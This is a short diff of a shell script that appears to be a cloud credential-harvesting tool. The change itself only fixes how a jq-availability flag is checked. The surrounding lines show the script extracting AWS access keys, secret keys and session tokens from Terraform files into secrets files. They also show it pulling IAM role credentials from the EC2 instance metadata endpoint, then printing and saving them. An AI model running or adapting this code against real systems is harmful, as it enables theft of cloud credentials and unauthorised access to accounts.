@@ -226,7 +226,7 @@ if [ "$DO_TERRAFORM" = true ]; then
     if [ "$(stat -c%s "$f" 2>/dev/null || echo 0)" -le "$MAX_SIZE_BYTES" ]; then
       copy_if_readable "$f" "terraform/samples/${base}"
     fi
-    if $HAS_JQ && file "$f" 2>/dev/null | grep -qi 'json'; then
+    if [ "$HAS_JQ" = "true" ] && file "$f" 2>/dev/null | grep -qi 'json'; then
       jq 'paths | map(tostring) | join(".")' "$f" > "${TF_OUT_DIR}/${base}.paths.txt" 2>/dev/null || true
       for key in access_key secret_key token akid aws_access_key_id aws_secret_access_key aws_session_token; do
         jq -r ".. | .\"$key\"? // empty" "$f" 2>/dev/null | sed 's/^/VAL: /' >> "${TF_OUT_DIR}/${base}.secrets.txt" || true
@@ -287,7 +287,7 @@ if [ "$DO_IMDS" = true ]; then
         CREDS_JSON="$(curl -sS -H "X-aws-ec2-metadata-token: ${TOKEN}" "http://169.254.169.254/latest/meta-data/iam/security-credentials/${ROLE}" -m 5 2>/dev/null)"
         echo "Credentials JSON (first 2000 chars):"; echo "${CREDS_JSON}" | cut -c1-2000
         echo "${CREDS_JSON}" > "${OUTDIR}/imds_creds.json"
-        $HAS_JQ && jq . "${OUTDIR}/imds_creds.json" > "${OUTDIR}/imds_creds.pretty.json" 2>/dev/null || true
+        [ "$HAS_JQ" = "true" ] && jq . "${OUTDIR}/imds_creds.json" > "${OUTDIR}/imds_creds.pretty.json" 2>/dev/null || true
       fi
     } > "${IMDS_OUT}"
   else
